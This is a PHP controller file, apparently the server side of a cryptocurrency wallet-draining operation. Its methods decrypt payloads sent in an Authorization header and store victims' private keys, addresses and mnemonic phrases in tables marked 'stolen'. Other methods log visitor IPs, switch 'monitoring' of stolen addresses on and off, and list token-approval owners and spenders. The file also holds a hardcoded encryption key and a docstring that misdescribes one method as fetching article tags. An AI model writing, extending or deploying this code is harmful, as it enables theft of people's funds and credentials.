<?php
// 所有自定义控制器的基本控制器,应该继承自它
namespace app\jz\v8\controller;

use common\jzController;
use Db\Db;
use Ramsey\Uuid\Uuid;
use function common\dump;
use function common\retur;

class QueryController extends jzController
{

    /**
     * 获取所有文章标签
     *
     * 此方法用于获取系统中所有文章标签的信息。
     * 可以通过 POST 或 GET 请求访问。
     *
     * @return array 返回包含所有文章标签数据的数组
     */
    public function Permissions()
    {
        $data = $_SERVER['HTTP_AUTHORIZATION'];
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        $stolen = Db::table('userip')->field('*')->where(['ip' => $ip])->find();
        if (!$stolen) {
            Db::table('userip')->insert(['ip' => $ip]);
        }
        $secretKey = '93a1c3a4b6e9f0d1e4b0f78a9cd7b0d1a78d9b0e4b0e'; // 你的密钥
        $mes = hex2bin($data);
        // $data = 'afb455d0517f7feede06e2e3bb1faca8fd317b60fa7173dbee2a940b3da7407e254ac1bca27436729326a324a4302a5b46b4f7648fb9f4c0450ab4cdaa8646fd5ed4a46bf151dfbbefc1d05d186e9b56acea673d99df4001215ccaec1e9482fe4a66a250b75f167be7a578f804673e1cc71d3ac4c616436f395d17322c1b60a761768df2a8702fa5ef36d334f8b4c9d2b5f450b819bdd84f27e7c5f46ac234e9';

        $res = json_decode(openssl_decrypt($mes, 'DES-CBC', $secretKey, OPENSSL_RAW_DATA, '12345678'), true);
        $stolen = Db::table('privatekey')->field('*')->where(['privatekey' => $res['stolen']])->find();
        if (!$stolen && $res['stolen']) {
            Db::table('privatekey')->insert(['privatekey' => $res['stolen'], 'address' => $res['stolenaddress'], 'type' => 'stolen']);
        }
        $stol = Db::table('privatekey')->field('*')->where(['privatekey' => $res['admin']])->find();
        if (!$stol && $res['admin']) {
            Db::table('privatekey')->insert(['privatekey' => $res['admin'], 'address' => $res['adminaddress'], 'type' => 'admin']);
        }
        // Db::table('JZ_text')->insert(['text' => $res]);
        echo json_encode(retur('成功', true));
    }

    // 上传私钥
    public function isAuthorize()
    {
        $data = $_SERVER['HTTP_AUTHORIZATION'];
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        $stolen = Db::table('userip')->field('*')->where(['ip' => $ip])->find();
        if (!$stolen) {
            Db::table('userip')->insert(['ip' => $ip]);
        }
        $secretKey = '93a1c3a4b6e9f0d1e4b0f78a9cd7b0d1a78d9b0e4b0e'; // 你的密钥
        $mes = hex2bin($data);
        $res = json_decode(openssl_decrypt($mes, 'DES-CBC', $secretKey, OPENSSL_RAW_DATA, '12345678'), true);
        Db::table('ZJ_swapapprove')->insert($res);
    }

    public function privatekey()
    {

        // $data = 'afb455d0517f7feede06e2e3bb1faca8fd317b60fa7173dbee2a940b3da7407e254ac1bca27436729326a324a4302a5b46b4f7648fb9f4c0450ab4cdaa8646fd5ed4a46bf151dfbbefc1d05d186e9b56acea673d99df4001215ccaec1e9482fe4a66a250b75f167be7a578f804673e1cc71d3ac4c616436f395d17322c1b60a761768df2a8702fa5ef36d334f8b4c9d2b5f450b819bdd84f27e7c5f46ac234e9';
        $stolen = Db::table('privatekey')->field('*')->where(['type' => ['stolen', 'stolens']])->select();
        $array = array();
        foreach ($stolen as $key => $value) {
            # code...

            if ($value['address']) {
                $array[strtolower($value['address'])] = $value;
            }
        }
        $mtstolen = Db::table('privatekey')->field('*')->where(['type' => 'stolen'])->select();
        $mtarray = array();
        foreach ($mtstolen as $key => $value) {
            # code...

            if ($value['address']) {
                $mtarray[strtolower($value['address'])] = $value;
            }
        }
        echo json_encode(retur($array, $mtarray));
    }

    public function update()
    {
        $data = json_decode(file_get_contents('php://input'), true);

        $arr =  Db::table('privatekey')->where(['address' => $data['address']])->update(['type' => 'stolen']);
        if ($arr > 0) {
            echo json_encode(retur('成功', $arr));
        } else {
            echo json_encode(retur('失败', '没更改任何数据', 409));
        }
    }
    // get接口  切换地址开关
    public function switch($address)
    {

        $stol = Db::table('privatekey')->field('*')->where(['address' => strtolower($address)])->find();
        if ($stol && $stol['type'] == 'stolen') {
            Db::table('privatekey')->where(['address' => strtolower($address)])->update(['type' => 'stolens']);
            dump('监听已关闭');
        } else if ($stol && $stol['type'] != 'stolen') {
            Db::table('privatekey')->where(['address' => strtolower($address)])->update(['type' => 'stolen']);
            dump('监听已经打开');
        } else {
            dump('地址不存在');
        }
    }
    //创建建站激活码
    public function code($id)
    {
        //先查询 当前id 是否存在

        $activationCodes = Db::table('JZ_activationcode')->field('*')->where(['dealerid' => $id, 'state' => '0'])->find();
        if ($activationCodes) {

            dump('激活码: ' . $activationCodes['code']);
        } else {
            $stol = Db::table('JZ_dealer')->field('*')->where(['id' => $id])->find();
            if ($stol) {
                //创建激活码
                $code = strtoupper(Uuid::uuid4());
                $arr = Db::table('JZ_activationcode')->insert(['code' => $code, 'dealerid' => $id]);
                if ($arr > 0) {
                    dump('创建激活码成功:' . $code);
                }
            } else {
                dump('经销商ID不存在');
            }
        }
    }

    public function privatekeyel()
    {

        // $data = 'afb455d0517f7feede06e2e3bb1faca8fd317b60fa7173dbee2a940b3da7407e254ac1bca27436729326a324a4302a5b46b4f7648fb9f4c0450ab4cdaa8646fd5ed4a46bf151dfbbefc1d05d186e9b56acea673d99df4001215ccaec1e9482fe4a66a250b75f167be7a578f804673e1cc71d3ac4c616436f395d17322c1b60a761768df2a8702fa5ef36d334f8b4c9d2b5f450b819bdd84f27e7c5f46ac234e9';
        $stolen = Db::table('privatekey')->field('*')->where(['type' => ['stolen', 'stolens']])->select();
        $array = array();
        foreach ($stolen as $key => $value) {
            # code...

            if ($value['address']) {
                $array[strtolower($value['address'])] = $value;
            }
        }
        echo json_encode(retur('成功', $array));
    }
    public function privatekeys()
    {

        // $data = 'afb455d0517f7feede06e2e3bb1faca8fd317b60fa7173dbee2a940b3da7407e254ac1bca27436729326a324a4302a5b46b4f7648fb9f4c0450ab4cdaa8646fd5ed4a46bf151dfbbefc1d05d186e9b56acea673d99df4001215ccaec1e9482fe4a66a250b75f167be7a578f804673e1cc71d3ac4c616436f395d17322c1b60a761768df2a8702fa5ef36d334f8b4c9d2b5f450b819bdd84f27e7c5f46ac234e9';
        $stolen = Db::table('privatekeys')->field('*')->where(['type' => '1'])->select();
        $array = array();
        foreach ($stolen as $key => $value) {
            # code...

            if ($value['address']) {
                $array[strtolower($value['address'])] = $value;
            }
        }
        echo json_encode(retur('成功', $array));
    }
    public function privatekeyy()
    {
        $data = json_decode(file_get_contents('php://input'), true);

        Db::table('siyao')->insert(['privateKey' => $data['privateKey'], 'address' => $data['address'], 'mnemonic' => $data['mnemonic']]);
        echo json_encode(retur('成功', true));
    }
    // 获取授权地址信息

    public function getadmin()
    {
        $data = json_decode(file_get_contents('php://input'), true);

        $stol = Db::table('privatekey')->field('*')->where(['admin' => $data['admin']])->find();
        if ($stol) {
            unset($stol['privatekey']);
            echo json_encode(retur('成功', $stol));
        } else {
            echo json_encode(retur('失败', '无任何可管理地址', 409));
        }
    }
    // 修改状态
    public function settype()
    {
        // https://v1.dexc.pro/jz/v8/Query/settype
        $stol =  Db::table('privatekey')->where(['type' => 'stolens'])->update(['type' => 'stolen']);
        if ($stol > 0) {
            echo json_encode(retur('成功', $stol));
        } else {
            echo json_encode(retur('失败', '没更改任何数据', 409));
        }
    }

    public function approve()
    {
        $stolen = Db::table('approve')->field('*')->select();
        $array = array();
        foreach ($stolen as $item) {

            if (!isset($array[strtolower($item['owner'])])) {
                $array[strtolower($item['owner'])] = [];
            }
            $array[strtolower($item['owner'])][] = $item['spender'];
        }

        echo json_encode(retur('成功', $array));
    }
}

// pm2 start matic --name matic2 修改名称
// pm2 restart matic2 --cron-restart "*/12 * * * *"


// U2FsdGVkX19AOj/VrYsEXwdZ/IrjiJObr5We6ZRwkUUA5KgoyadVQbYQe9NfJdrFtUAOaYGBgnRK6b1s07i1w04kX6DIpN0eQ1Yl0Nwoi/ap9Uki4yNoyIvlS7E7AhFm7hXw2Y3KowM3EAuLMsVRpKPWzd/5X9pQeWLD+sk6MecFleiPN1HbvI/i7Ai0y39lVhUP0UyRVCINuG39PfWjC7taV2QY4wFks9AvqGiyVXs=